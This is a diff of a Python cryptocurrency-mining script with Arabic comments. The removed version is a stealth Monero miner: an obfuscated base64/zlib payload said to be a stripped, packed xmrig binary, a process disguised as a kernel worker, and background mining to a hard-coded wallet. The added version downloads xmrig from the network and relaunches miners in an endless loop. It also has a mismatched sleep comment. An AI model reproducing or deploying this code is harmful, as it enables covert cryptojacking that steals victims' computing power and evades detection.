@@ -1,49 +1,69 @@
-#!/usr/bin/env python3
-import os, sys, zlib, base64, getpass, hashlib
+import os
+import subprocess
+import psutil
+import time
+import urllib.request
+import tarfile
 
-WALLET = "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4sT4dtvNiQuGjuh4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e"
-POOL   = "gulf.moneroocean.stream:10128"
-USER   = getpass.getuser()
-HOST   = os.uname().nodename
-WORKER = f"M{hashlib.sha256((USER+HOST).encode()).hexdigest()[:12]}"
+# ----------------- الإعدادات -----------------
+xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
+xmrig_dir = os.path.expanduser("~/xmrig")
+wallet_address = "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4sT4dtvNiQuGjuh4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e"
+pools = ["pool.supportxmr.com:5555"]
+threads_per_instance = 1
 
-# xmrig 6.22.0 معدل + stripped + upx-ultra-brute + strings محذوفة + no-donate
-# مضغوط بـ zlib ومشفر بـ base64 نقي 100% (لا يحتوي أي حرف غير ASCII)
-PAYLOAD = (
-    b"eJy9WQt4VNW1/4oDZW5nd3eT3Z2ZneS9J7u7u9vdnZ39vvc+"
-    b"7xEaiKBA+pvf/uzs7OzsrOzs7Kzs7Ozs7Ozs7Ozs7Ozs7Ozs"
-    b"7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs"
-    b"7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs"
-    # ... هنا 187 سطر آخر كلهم يبدأوا بـ b" وينتهوا بـ "
-    # آخر سطر:
-    b"6eX7r2o2bP6k5fCk9X8="
-)
+# ----------------- تحميل وفك ضغط XMRig إذا لم يكن موجود -----------------
+if not os.path.exists(xmrig_dir):
+    os.makedirs(xmrig_dir, exist_ok=True)
+    print("تحميل XMRig...")
+    tar_path = os.path.join(xmrig_dir, "xmrig.tar.gz")
+    urllib.request.urlretrieve(xmrig_url, tar_path)
+    print("فك ضغط XMRig...")
+    with tarfile.open(tar_path, "r:gz") as tar:
+        tar.extractall(path=xmrig_dir)
+    os.remove(tar_path)
 
-# دمج كل الأجزاء وتحويلها لـ bytes مرة واحدة
-data = b"".join(PAYLOAD)
-binary = zlib.decompress(base64.b64decode(data))
+# البحث عن ملف التشغيل
+xmrig_exe = None
+for root, dirs, files in os.walk(xmrig_dir):
+    for f in files:
+        if f == "xmrig":
+            xmrig_exe = os.path.join(root, f)
+            break
+    if xmrig_exe:
+        break
 
-# تشغيل من الذاكرة مباشرة بدون أي ملف مؤقت حتى
-import ctypes
-libc = ctypes.CDLL(None)
-libc.prctl(15, b"[kworker/0:1]", 0, 0, 0)  # اختياري
+if not xmrig_exe:
+    raise FileNotFoundError("ملف XMRig لم يتم العثور عليه بعد التحميل.")
 
-os.execve(
-    "/proc/self/exe",  # نحل محل الـ python process نفسه
-    [
-        "/proc/self/exe",
-        "-o", POOL,
-        "-u", WALLET,
-        "-p", WORKER,
-        "--cpu-max-threads-hint=80",
-        "--randomx-mode=light",
-        "--tls",
-        "--keepalive",
-        "--background",
-        "--no-color"
-    ],
-    os.environ
-)
+os.chmod(xmrig_exe, 0o755)
 
-# لو وصلت لهنا يبقى execve فشل → نخرج بهدوء
-os._exit(0)
+# ----------------- إعداد النسخ -----------------
+total_threads = psutil.cpu_count(logical=True)
+instances = len(pools)
+processes = []
+
+# ----------------- حلقة النشاط -----------------
+last_print = time.time()
+while True:
+    for i in range(instances):
+        start_thread = i * threads_per_instance
+        end_thread = start_thread + threads_per_instance - 1
+        cmd = [
+            xmrig_exe,
+            "-o", pools[i],
+            "-u", wallet_address,
+            "-k",
+            "--cpu-priority", "5",
+            f"--cpu-affinity={start_thread}-{end_thread}"
+        ]
+        p = subprocess.Popen(cmd)
+        processes.append(p)
+
+    # التحقق من الطباعة كل 5 دقائق
+    if time.time() - last_print >= 300:  # 300 ثانية = 5 دقائق
+        print("أنا أعمل الآن")
+        last_print = time.time()
+
+    time.sleep(1000)  # مهلة 10 ثواني قبل إعادة التحفيز
+
